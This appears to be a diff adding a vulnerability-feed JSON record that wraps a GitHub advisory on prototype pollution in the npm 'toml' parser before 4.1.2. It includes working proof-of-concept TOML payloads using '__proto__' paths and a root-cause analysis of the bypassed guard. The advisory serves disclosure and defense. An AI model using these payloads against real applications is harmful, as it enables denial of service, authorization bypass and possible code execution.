@@ -1,0 +1,59 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [], \"cve_id\": \"CVE-2026-63376\", \"cvss\": {\"score\": 8.2, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 8.2, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-1321\", \"name\": \"Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')\"}], \"description\": \"### Summary\\n\\n`toml.parse()` writes attacker-controlled keys onto `Object.prototype`. The compiler protects the tables it builds by creating them with `Object.create(null)`, which neutralizes a direct `[__proto__]` table. An attacker bypasses that protection by routing a table path *through a scalar value* and into the real prototype chain: a path such as `a.b.y.__proto__.__proto__`, where `a.b.y` holds a number, resolves to `Object.prototype` and every subsequent key/value writes onto it.\\n\\nThe bypass succeeds because the compiler's duplicate-key guards track paths with keys that do not match the keys used during traversal. The tracking strings and the traversal strings **desynchronize**, so the guard that should reject descending through an existing scalar never fires.\\n\\n### Steps to reproduce\\n\\n1. Install the latest version and run the comma-desynchronization payload.\\n\\n   ```bash\\n   npm install toml@4.1.1\\n   ```\\n\\n   ```js\\n   const toml = require(\\\"toml\\\");\\n   delete Object.prototype.polluted;\\n\\n   toml.parse(`\\n   [a.b]\\n   y = 1\\n   [a.b.y.__proto__.__proto__]\\n   polluted = \\\"yes\\\"\\n   `);\\n\\n   console.log(({}).polluted);   // -> \\\"yes\\\"\\n   ```\\n\\n2. Observe that a freshly created object inherits the injected key, confirming `Object.prototype` was modified:\\n\\n   ```\\n   yes\\n   ```\\n\\n3. Confirm the prefix-clear variant reaches the same result:\\n\\n   ```js\\n   toml.parse(`\\n   aa = 1\\n   [[a]]\\n   [aa.__proto__.__proto__]\\n   polluted = \\\"yes\\\"\\n   `);\\n   console.log(({}).polluted);   // -> \\\"yes\\\"\\n   ```\\n\\nA nested gadget object is also injectable, not only scalar keys:\\n\\n```js\\ntoml.parse(`\\n[a.b]\\ny = 1\\n[a.b.y.__proto__.__proto__.code]\\nval = \\\"arbitrary\\\"\\n`);\\nconsole.log(({}).code.val);     // -> \\\"arbitrary\\\"\\n```\\n\\n### Technical details\\n\\nThe compiler builds the result tree in `lib/compiler.js`. Tables are created with a null prototype, so a direct `[__proto__]` table only sets an ordinary own property and does not pollute:\\n\\n```js\\nvar data = Object.create(null);   // line 7 — root has no prototype\\n// ...\\ntarget[k] = Object.create(null);  // line 64 — intermediate tables, no prototype\\n```\\n\\nThe defect is in `deepRef`, which resolves a table path by walking each key segment of the live object graph:\\n\\n```js\\nfunction deepRef(start, keys, value, off) {        // lib/compiler.js:183\\n  var traversedPath = \\\"\\\";\\n  var ctx = start;\\n  for (var i = 0; i < keys.length; i++) {\\n    var key = keys[i];\\n    traversedPath = traversedPath ? traversedPath + \\\".\\\" + key : key;\\n    if (typeof ctx[key] === \\\"undefined\\\") {\\n      if (i === keys.length - 1) { ctx[key] = value; }\\n      else { ctx[key] = Object.create(null); }\\n    } else if (i !== keys.length - 1 && valueAssignments.has(traversedPath)) {\\n      genError(\\\"Cannot redefine existing key '\\\" + traversedPath + \\\"'.\\\", off);  // line 197 — the guard\\n    }\\n    ctx = ctx[key];                                // line 200 — follows __proto__ into the prototype chain\\n    if (ctx instanceof Array && ctx.length && i < keys.length - 1) {\\n      ctx = ctx[ctx.length - 1];\\n    }\\n  }\\n  return ctx;\\n}\\n```\\n\\nTwo problems combine:\\n\\n**1. `deepRef` treats `__proto__` (and `constructor`, `prototype`) as ordinary traversable keys.** Line 200 executes `ctx = ctx[key]` for every segment with no reserved-key check. When traversal reaches a scalar value — for example the number `1` stored at `a.b.y` — the next two `__proto__` segments evaluate to `Number.prototype` and then `Object.prototype`. The null-prototype hardening covers only the *container tables* the compiler creates; it does not cover the *values* stored in them, and those values carry normal prototypes.\\n\\n**2. The guard on line 197 is defeated by a path-format desynchronization.** `currentPath` is assigned two incompatible types: `setPath` stores an **array** (`currentPath = path`, line 151) while `addTableArray` stores a **string** (`currentPath = quotedPath`, line 172). When `assign` later builds the path of a value, it concatenates that array with a string:\\n\\n```js\\nvar fullPath = currentPath ? currentPath + \\\".\\\" + keys.join(\\\".\\\") : keys.join(\\\".\\\"); // line 77\\nvalueAssignments.add(fullPath);                                                   // line 86\\n```\\n\\nFor the table `[a.b]`, `currentPath` is the array `[\\\"a\\\",\\\"b\\\"]`, so `currentPath + \\\".\\\"` coerces it via `Array.toString()` to the **comma-joined** string `\\\"a,b\\\"`. The value `y = 1` is therefore recorded as `\\\"a,b.y\\\"`. But `deepRef`, walking the path `a.b.y.__proto__.__proto__`, builds `traversedPath` with dots and checks `valueAssignments.has(\\\"a.b.y\\\")`. The set contains `\\\"a,b.y\\\"`, not `\\\"a.b.y\\\"`, so the lookup misses and the guard never raises \\\"Cannot redefine existing key\\\". Traversal proceeds through the scalar `1` into `Object.prototype`.\\n\\nInstrumenting the tracking sets after parsing the payload confirms the mismatch:\\n\\n```\\nassignedPaths    : [ \\\"a.b\\\", \\\"a,b.y\\\", \\\"a.b.y.__proto__.__proto__\\\", ... ]\\nvalueAssignments : [ \\\"a,b.y\\\", ... ]\\ndeepRef checks valueAssignments.has(\\\"a.b.y\\\")  ->  false   (recorded as \\\"a,b.y\\\")\\n```\\n\\nA second route reaches the same state without the comma trick. A table array `[[a]]` triggers the prefix-clearing loop in `addTableArray`, which deletes tracking entries by string prefix and wipes the guard state before the `__proto__` descent:\\n\\n```js\\nassignedPaths.forEach(function(p) {                 // lines 164-166\\n  if (p.indexOf(quotedPath) === 0) assignedPaths.delete(p);\\n});\\nvalueAssignments.forEach(function(p) {              // lines 167-169\\n  if (p.indexOf(quotedPath) === 0) valueAssignments.delete(p);\\n});\\n```\\n\\n### Impact\\n\\n- Any application that calls `toml.parse()` on a TOML document an attacker can influence — uploaded configuration, project manifests, multi-tenant settings, package metadata — allows the attacker to write arbitrary properties onto `Object.prototype`.\\n- Injected properties become visible on every object in the process. Depending on application gadgets, this enables denial of service (corrupting properties the runtime relies on), logic and authorization bypass (overriding flags read from plain objects), and, with a suitable sink, remote code execution.\\n- The blast radius is the whole Node.js process, not just the parsed result object.\\n- `toml` reports roughly 14.8 million weekly downloads and around 1,340 dependents, so the transitive exposure is large. Dependents that pass `toml` as the engine to front-matter or configuration loaders inherit the issue.\\n\\n---\\n\\nCredit: Duy Bui / @[calif.io](http://calif.io/)\", \"ghsa_id\": \"GHSA-v5mp-jgw5-2x6j\", \"github_reviewed_at\": \"2026-09-03T20:55:32Z\", \"html_url\": \"https://github.com/advisories/GHSA-v5mp-jgw5-2x6j\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-v5mp-jgw5-2x6j\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-63376\"}], \"nvd_published_at\": null, \"published_at\": \"2026-09-03T20:55:32Z\", \"references\": [\"https://github.com/BinaryMuse/toml-node/security/advisories/GHSA-v5mp-jgw5-2x6j\", \"https://github.com/BinaryMuse/toml-node/commit/def6ab5ea99038c0dd482cd6af1745a6af8b4c44\", \"https://github.com/BinaryMuse/toml-node/commit/dfaff662276adc38a2e03df3139f7119b0185463\", \"https://github.com/advisories/GHSA-v5mp-jgw5-2x6j\"], \"repository_advisory_url\": \"https://api.github.com/repos/BinaryMuse/toml-node/security-advisories/GHSA-v5mp-jgw5-2x6j\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/BinaryMuse/toml-node\", \"summary\": \"toml-node: Prototype Pollution Leads to `Object.prototype` Corruption via `__proto__` Key-Path Desynchronization\", \"type\": \"reviewed\", \"updated_at\": \"2026-09-03T20:55:34Z\", \"url\": \"https://api.github.com/advisories/GHSA-v5mp-jgw5-2x6j\", \"vulnerabilities\": [{\"first_patched_version\": \"4.1.2\", \"package\": {\"ecosystem\": \"npm\", \"name\": \"toml\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 4.1.2\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-v5mp-jgw5-2x6j",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_entries": {},
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "toml: < 4.1.2"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-63376"
+    ],
+    "cvss_score": 8.2,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "toml"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-09-04T19:12:53.994507Z",
+  "provenance": {
+    "content_sha256": "7d193b733915f5645d3b015473757cf6628250dfc3c80ac7b856b7de10748eb0",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-09-03T20:55:32Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-v5mp-jgw5-2x6j",
+  "status": "active",
+  "title": "toml-node: Prototype Pollution Leads to `Object.prototype` Corruption via `__proto__` Key-Path Desynchronization",
+  "updated_at": "2026-09-03T20:55:34Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-v5mp-jgw5-2x6j"
+}
